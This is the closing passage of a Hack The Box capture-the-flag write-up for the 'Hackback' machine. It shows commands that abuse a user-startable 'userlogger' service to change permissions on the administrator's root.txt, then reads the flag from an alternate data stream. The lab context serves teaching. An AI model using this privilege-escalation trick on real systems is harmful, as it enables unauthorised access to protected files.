#### Description says it's responsible for logging user activity. I tried to start that service as `hacker` :
```
C:\Windows\system32>sc start userlogger
sc start userlogger

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368   
        FLAGS              :
```
#### `hacker` was allowed to start and stop the service. I started to look more into the service and test it. I created a test file and called it `test.txt` then I started the service and gave it the file as a parameter : `sc start userlogger test.txt`. It created a new file called `test.txt.log` :
```
C:\Users\hacker\Documents>type test.txt.log
type test.txt.log

Logfile specified!
Service is starting
Service is running
```
#### Nothing interesting, however when I checked the permissions of that file :
```
C:\Users\hacker\Documents>cacls C:\Users\hacker\Documents\test.txt.log
cacls C:\Users\hacker\Documents\test.txt.log

C:\Users\hacker\Documents\test.txt.log Everyone: F
```
#### It's readable by everyone. This means we can use this service to read anything we don't have access to, but how will we do that ? it adds `.log` after the file name ..
#### Since windows doesn't accept `:` in filenames we can try to read `root.txt` like this : `sc start userlogger C:\users\administrator\desktop\root.txt:`
#### When it tries to add `.log` everything after `:` will be removed and the new permissions will be applied to `root.txt` :
```
PS C:\> cmd /c "sc start userlogger 'c:\users\administrator\desktop\root.txt:'"
cmd /c "sc start userlogger 'c:\users\administrator\desktop\root.txt:'"

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1368  
        FLAGS              : 
```
![](/images/hackthebox/hackback/30.png)
#### It worked and we are able to read `root.txt`. But what is this ? A troll ? 
#### Just like bighead I suspected that it had an alternate data stream, but without using `streams.exe` I tried some stuff and one of my guesses worked :
`cat c:\users\administrator\desktop\root.txt:flag.txt`
![](/images/hackthebox/hackback/31.png)
#### And we owned root !
#### That's it , Feedback is appreciated !
#### Don't forget to read the [previous write-ups](/categories) , Tweet about the write-up if you liked it , follow on twitter for awesome resources [@Ahm3d_H3sham](https://twitter.com/Ahm3d_H3sham)
#### Thanks for reading.
<br>
<br>
#### Previous Hack The Box write-up : [Hack The Box - Netmon](/hack-the-box/netmon/)
<hr>
